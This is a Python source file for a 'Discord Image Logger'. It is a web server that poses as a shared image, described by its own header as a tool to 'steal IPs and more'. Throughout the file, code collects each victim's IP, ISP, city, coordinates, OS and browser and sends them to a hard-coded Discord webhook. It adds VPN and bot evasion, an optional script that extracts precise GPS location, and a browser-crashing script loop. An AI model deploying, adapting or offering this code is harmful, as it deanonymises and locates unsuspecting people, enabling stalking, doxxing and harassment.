# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1136782653459279984/v_nUCu4BGY3P8sIhJBjnYbHvfi45HK13NqfX5xdjQsdlRuNuTh9TTMlTThZEz7QPZT2r",
    "image": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4QCWRXhpZgAASUkqAAgAAAACAA4BAgBZAAAAJgAAAJiCAgAPAAAAfwAAAAAAAABIb3QgRG9nIHdpdGggS2V0Y2h1cCxNdXN0YXJkLFJlbGlzaCBhbmQgT25pb25zIC0gUGhvdG9ncmFwaGVkIG9uIEhhc3NlbGJsYWQgQ2FtZXJhIFN5c3RlbUxhdXJpIFBhdHRlcnNvbv/tALJQaG90b3Nob3AgMy4wADhCSU0EBAAAAAAAlhwCUAAOTGF1cmlQYXR0ZXJzb24cAngAWUhvdCBEb2cgd2l0aCBLZXRjaHVwLE11c3RhcmQsUmVsaXNoIGFuZCBPbmlvbnMgLSBQaG90b2dyYXBoZWQgb24gSGFzc2VsYmxhZCBDYW1lcmEgU3lzdGVtHAJ0AA9MYXVyaSBQYXR0ZXJzb24cAm4ADEdldHR5IEltYWdlc//hBXBodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iPgoJPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KCQk8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iIHhtbG5zOklwdGM0eG1wQ29yZT0iaHR0cDovL2lwdGMub3JnL3N0ZC9JcHRjNHhtcENvcmUvMS4wL3htbG5zLyIgICB4bWxuczpHZXR0eUltYWdlc0dJRlQ9Imh0dHA6Ly94bXAuZ2V0dHlpbWFnZXMuY29tL2dpZnQvMS4wLyIgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIiB4bWxuczpwbHVzPSJodHRwOi8vbnMudXNlcGx1cy5vcmcvbGRmL3htcC8xLjAvIiAgeG1sbnM6aXB0Y0V4dD0iaHR0cDovL2lwdGMub3JnL3N0ZC9JcHRjNHhtcEV4dC8yMDA4LTAyLTI5LyIgeG1sbnM6eG1wUmlnaHRzPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvcmlnaHRzLyIgZGM6UmlnaHRzPSJMYXVyaSBQYXR0ZXJzb24iIHBob3Rvc2hvcDpDcmVkaXQ9IkdldHR5IEltYWdlcyIgR2V0dHlJbWFnZXNHSUZUOkFzc2V0SUQ9IjE1NzQ4MzQyNSIgeG1wUmlnaHRzOldlYlN0YXRlbWVudD0iaHR0cHM6Ly93d3cuZ2V0dHlpbWFnZXMuY29tL2V1bGE/dXRtX21lZGl1bT1vcmdhbmljJmFtcDt1dG1fc291cmNlPWdvb2dsZSZhbXA7dXRtX2NhbXBhaWduPWlwdGN1cmwiID4KPGRjOmNyZWF0b3I+PHJkZjpTZXE+PHJkZjpsaT5MYXVyaVBhdHRlcnNvbjwvcmRmOmxpPjwvcmRmOlNlcT48L2RjOmNyZWF0b3I+PGRjOmRlc2NyaXB0aW9uPjxyZGY6QWx0PjxyZGY6bGkgeG1sOmxhbmc9IngtZGVmYXVsdCI+SG90IERvZyB3aXRoIEtldGNodXAsTXVzdGFyZCxSZWxpc2ggYW5kIE9uaW9ucyAtIFBob3RvZ3JhcGhlZCBvbiBIYXNzZWxibGFkIENhbWVyYSBTeXN0ZW08L3JkZjpsaT48L3JkZjpBbHQ+PC9kYzpkZXNjcmlwdGlvbj4KPHBsdXM6TGljZW5zb3I+PHJkZjpTZXE+PHJkZjpsaSByZGY6cGFyc2VUeXBlPSdSZXNvdXJjZSc+PHBsdXM6TGljZW5zb3JVUkw+aHR0cHM6Ly93d3cuZ2V0dHlpbWFnZXMuY29tL2RldGFpbC8xNTc0ODM0MjU/dXRtX21lZGl1bT1vcmdhbmljJmFtcDt1dG1fc291cmNlPWdvb2dsZSZhbXA7dXRtX2NhbXBhaWduPWlwdGN1cmw8L3BsdXM6TGljZW5zb3JVUkw+PC9yZGY6bGk+PC9yZGY6U2VxPjwvcGx1czpMaWNlbnNvcj4KCQk8L3JkZjpEZXNjcmlwdGlvbj4KCTwvcmRmOlJERj4KPC94OnhtcG1ldGE+Cjw/eHBhY2tldCBlbmQ9InciPz4K/9sAhAAJBgcIBwYJCAcICgoJCw0WDw0MDA0bFBUQFiAdIiIgHR8fJCg0LCQmMScfHy09LTE1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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
